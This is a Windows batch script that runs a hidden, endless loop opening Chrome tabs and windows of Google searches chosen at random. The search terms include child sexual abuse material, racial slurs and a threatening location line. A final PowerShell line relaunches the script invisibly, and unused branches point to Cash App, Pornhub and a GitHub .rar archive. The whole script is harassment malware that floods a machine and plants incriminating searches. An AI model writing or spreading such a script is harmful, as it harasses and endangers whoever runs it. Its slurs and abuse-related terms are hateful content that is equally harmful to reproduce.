@echo off
timeout /t 2 >nul

set TAB_COUNT=0

:loop
REM Pick a random number 0–9
set /a r=%RANDOM% %% 10

REM Random search list
if %r%==0 set q=how+to+fuck+kids
if %r%==1 set q=child+porn
if %r%==2 set q=free+robux+exe
if %r%==3 set q=no+escape
if %r%==4 set q=fuck+niggers
if %r%==5 set q=hi+nigga
if %r%==6 set q=fuck+you+nigger+ez
if %r%==7 set q=gay+sexxy+porn
if %r%==8 set q=porn+hub
if %r%==9 set q=discord+egirl+meetup+location
if %r%==10 set q=you+live+in+chester+south+carolina
if %r%==11 set site=https://www.pornhub.com
if %r%==12 set site=https://www.cashapp.com
if %r%==13 set site=https://www.cashapp.com
if %r%==14 set site=https://www.cashapp.com
if %r%==15 set site=https://www.cashapp.com
if %r%==16 set site=https://www.cashapp.com
if %r%==17 set site=https://www.cashapp.com
if %r%==18 set site=https://www.cashapp.com
if %r%==19 set site=https://www.cashapp.com
if %r%==20 set site=https://www.cashapp.com
if %r%==21 set site=https://www.cashapp.com
if %r%==22 set site=https://www.cashapp.com
if %r%==23 set site=https://github.com/QuorumHub1/QAPIx/raw/refs/heads/main/QuorumAPI.rar



REM New window after 20 tabs
if %TAB_COUNT%==20 (
    start chrome --new-window "https://www.google.com/search?q=%q%"
    set TAB_COUNT=1
    timeout /t 0 >nul
    goto loop
)

REM Normal tab
start chrome "https://www.google.com/search?q=%q%"
set /a TAB_COUNT+=1
timeout /t 0 >nul
goto loop

@echo off
powershell -windowstyle hidden -command "Start-Process '%~dp0yourscript.bat' -WindowStyle Hidden"


